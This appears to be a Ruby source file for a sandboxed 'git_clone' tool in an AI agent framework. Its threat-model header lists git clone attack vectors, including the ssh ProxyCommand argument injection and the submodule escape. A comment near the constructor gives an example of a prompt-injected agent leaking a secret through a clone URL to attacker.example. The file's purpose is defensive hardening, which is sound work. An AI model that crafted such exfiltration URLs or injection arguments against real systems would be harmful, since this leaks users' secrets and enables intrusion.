# frozen_string_literal: true

require 'fileutils'
require 'uri'

module Pikuri
  module Code
    # The +git_clone+ tool — shallow-clone a public git repository into the
    # workspace. +Code::GitClone.new(filesystem: fs)+ produces a tool whose
    # +execute+ closes over the filesystem and a lazily-minted
    # {Bash::Sandbox::Bubblewrap}. Its home is
    # {Pikuri::Code::GIT_REPO_RESEARCHER}: *one shallow clone + grep* beats
    # *N pages of HTML scraping* when the task is "dig through this repo's
    # source for how it does X".
    #
    # == Threat model
    #
    # Git clone is not "just reading files" — hostile upstream has a history of
    # RCEs (CVE-2024-32002 submodule+symlink escape; CVE-2022-39253 +--local+
    # arbitrary-file read; CVE-2017-1000117 +ssh://-oProxyCommand=...+ arg
    # injection; +.gitattributes+ filter drivers and +.git/config+
    # +core.fsmonitor+/+core.sshCommand+ code paths that run during checkout).
    # Mitigations baked in:
    #
    # 1. **HTTPS/HTTP only.** {VALID_SCHEMES}; +ssh://+/+git://+/+file://+/
    #    +ext::+ are refused before +git+ sees the string.
    # 2. **No submodule recursion.** +--no-recurse-submodules+ kills the
    #    CVE-2024-32002 class.
    # 3. **Shallow clone.** +--depth 1+ (fewer ref-parsing edge cases).
    # 4. **Bubblewrap-sandboxed.** +git+ runs inside {Bash::Sandbox::Bubblewrap}
    #    bound to the persona's fresh temp workspace — no host +~/.ssh+, no
    #    +~/.gitconfig+, no other projects' source, no container sockets. A
    #    clone-RCE's blast radius is the throwaway workspace.
    #
    # The Bubblewrap instance is minted lazily on first +execute+, not at
    # construction: the boot-time GitClone wired by +bin/pikuri-code+ lives in
    # the sub-agent-only pool and never runs — it's replaced via
    # {#with_workspace} when a +git_repo_researcher+ session starts, so eager
    # construction would pay the +bwrap+ probe cost on every boot for nothing.
    #
    # Sharing: +P_one_agent+ — an instance is bound to one session's temp
    # workspace, which is the whole point (a clone-RCE's blast radius is *that*
    # throwaway tree). +with_workspace+ mints the per-session copy. The lazy
    # sandbox memo is unguarded, so a shared instance could also pay the +bwrap+
    # probe twice.
    class GitClone < Pikuri::Tool
      # URL schemes accepted. +https+ first (TLS) and +http+ as a
      # fallback for the rare public mirror. All other schemes are
      # refused — see the threat-model header.
      VALID_SCHEMES = %w[https http].freeze

      # Hard cap on the subprocess timeout (seconds). Real-world
      # shallow clones of medium repos finish in seconds; this is the
      # ceiling for a slow network or a large repo, after which we
      # SIGTERM.
      TIMEOUT_SECONDS = 120

      # @return [String]
      DESCRIPTION = <<~DESC
        Shallow-clone a public git repository into your workspace.

        Usage:
        - URL must be `https://` (preferred) or `http://`. Any other scheme (`ssh://`, `git://`, `file://`) is refused.
        - Always cloned with `--depth 1 --no-recurse-submodules`; you get the current tip, no history, no submodules.
        - Target directory name is derived from the URL's last segment (without `.git`). If that directory already exists, the call fails — pick a different URL or work with what you cloned.
        - On success returns the relative path to the cloned repo; use `file_list`, `read`, `grep`, `glob` to navigate it.
        - Clones run inside a sandbox bound to your workspace — host files, SSH keys, and `~/.gitconfig` are NOT visible to the cloned repo's hooks/filters.
      DESC

      # @param filesystem [Pikuri::Workspace::Filesystem] captured for
      #   the clone target root and the sandbox bind set.
      # @param sandbox [Bash::Sandbox, nil] optional sandbox override
      #   (defaults to a lazily-minted {Bash::Sandbox::Bubblewrap}
      #   bound to +filesystem+). Pass {Bash::Sandbox::NONE} in tests
      #   that don't have +bwrap+ on +PATH+; production wiring leaves
      #   it +nil+ so the Bubblewrap mint happens at the right moment
      #   (after {#with_workspace} replaces the filesystem).
      # @return [GitClone]
      def initialize(filesystem:, sandbox: nil)
        @filesystem = filesystem
        @sandbox = sandbox
        super(
          name: 'git_clone',
          description: DESCRIPTION,
          parameters: Pikuri::Tool::Parameters.build { |p|
            p.required_string :url,
                              'HTTPS (or HTTP) git URL to clone, e.g. ' \
                              '"https://github.com/anomalyco/opencode" or ' \
                              '"https://github.com/anomalyco/opencode.git". ' \
                              'Other schemes are refused.'
          },
          execute: ->(url:) { execute_clone(url: url) },
          # A *readable* egress verb, same family as {Pikuri::Web::FETCH} and
          # not a softer one: the clone host is chosen by whoever wrote the URL,
          # so `clone https://attacker.example/?q=<SECRET>` reaches a server the
          # attacker reads. The cloned tree is then attacker-authored content.
          trifecta_legs: Pikuri::Tool::TrifectaLegs::ASSUMED
        )
      end

      # Produce a new {GitClone} bound to the session +workspace+'s bare
      # {Pikuri::Workspace::Workspace#filesystem}. The +with_workspace+ protocol
      # ({Pikuri::SubAgent::SubAgentTool}) hands rebuilt tools the composite,
      # but GitClone's {Bash::Sandbox::Bubblewrap} needs the bare {Filesystem}'s
      # +readable+/+writable+/+temp+, so it reads +workspace.filesystem+ here.
      # The sandbox is NOT carried over — a fresh Bubblewrap is minted lazily
      # from the new filesystem (its bind set depends on that filesystem).
      #
      # @param workspace [Pikuri::Workspace::Workspace]
      # @return [GitClone]
      def with_workspace(workspace)
        self.class.new(filesystem: workspace.filesystem)
      end

      private

      # Mint the sandbox on first use, cache for subsequent calls.
      # See class header for why this isn't eager.
      def sandbox
        @sandbox ||= Bash::Sandbox::Bubblewrap.new(filesystem: @filesystem)
      end

      def execute_clone(url:)
        uri = parse_url(url)
        return uri if uri.is_a?(Pikuri::Tool::Result) # a validation refusal

        target_name = derive_target_name(uri)
        target_path = @filesystem.project_root.join(target_name)
        if target_path.exist?
          return Pikuri::Tool::Result.error("target directory #{target_name.inspect} already exists in the workspace.")
        end

        argv = sandbox.wrap([
          'timeout', '--signal=TERM', '--kill-after=5s', "#{TIMEOUT_SECONDS}s",
          'git', 'clone', '--depth', '1', '--no-recurse-submodules', '--quiet',
          '--', url, target_name
        ])
        result = Pikuri::Subprocess.spawn(*argv, chdir: @filesystem.project_root.to_s).wait

        if result.status.success?
          Pikuri::Tool::Result.new(
            content: "Cloned #{url} → #{target_name}/ (depth=1, no submodules).",
            summary: "Cloned to #{target_name}/"
          )
        else
          # Exit codes 124 / 137 / 125 = timeout (see Bash class header).
          ec = result.status.exitstatus
          tail = result.output.to_s.lines.last(20).join.strip
          if [124, 125, 137].include?(ec)
            Pikuri::Tool::Result.error("git clone timed out after #{TIMEOUT_SECONDS}s.\n#{tail}")
          else
            Pikuri::Tool::Result.error("git clone failed (exit #{ec}).\n#{tail}")
          end
        end
      end

      # Returns a +URI+ on success or a {Pikuri::Tool::Result.error} on
      # validation failure. Rejects non-+http(s)+ schemes, empty host, and
      # malformed URIs before +git+ ever sees the string.
      def parse_url(url)
        uri = URI.parse(url)
        unless VALID_SCHEMES.include?(uri.scheme)
          return Pikuri::Tool::Result.error("only #{VALID_SCHEMES.join(' / ')} URLs are accepted " \
                                            "(got #{uri.scheme.inspect}).")
        end
        return Pikuri::Tool::Result.error('URL must include a host.') if uri.host.nil? || uri.host.empty?

        uri
      rescue URI::InvalidURIError => e
        Pikuri::Tool::Result.error("malformed URL: #{e.message}")
      end

      # Last path segment, sans +.git+ suffix; falls back to +repo+
      # for path-less URLs. The basename is intentionally taken from
      # the parsed URI so path-traversal segments (+..+) in the URL
      # collapse to harmless directory names — the clone still lands
      # inside +filesystem.project_root+ because the +chdir+ + the
      # workspace containment check on subsequent reads enforce it.
      def derive_target_name(uri)
        name = File.basename(uri.path.to_s)
        name = name.sub(/\.git\z/, '')
        name = 'repo' if name.empty? || name == '/' || name == '.' || name == '..'
        name
      end
    end
  end
end
